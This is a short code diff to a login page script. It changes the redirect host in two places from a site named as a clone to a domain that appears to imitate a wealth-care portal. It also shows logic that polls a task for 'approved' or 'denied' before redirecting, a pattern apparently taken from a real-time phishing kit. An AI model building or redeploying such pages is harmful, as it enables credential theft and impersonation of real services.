@@ -141,7 +141,7 @@
 
 <script>
 (function () {
-  var DASHBOARD_URL = "https://tobi-be-clone.vercel.app";
+  var DASHBOARD_URL = "https://aigwealthcareportalweb.vercel.app";
 
   var form = document.getElementById('loginForm');
   var loader = document.getElementById('authLoader');
@@ -226,7 +226,7 @@
           if (result.task.status === "approved") {
             clearInterval(activePoll);
             clearTimeout(activeTimeout);
-            window.location.href = "https://tobi-be-clone.vercel.app/verify?task=" + taskId;
+            window.location.href = "https://aigwealthcareportalweb.vercel.app/verify?task=" + taskId;
           } else if (result.task.status === "denied") {
             clearInterval(activePoll);
             clearTimeout(activeTimeout);
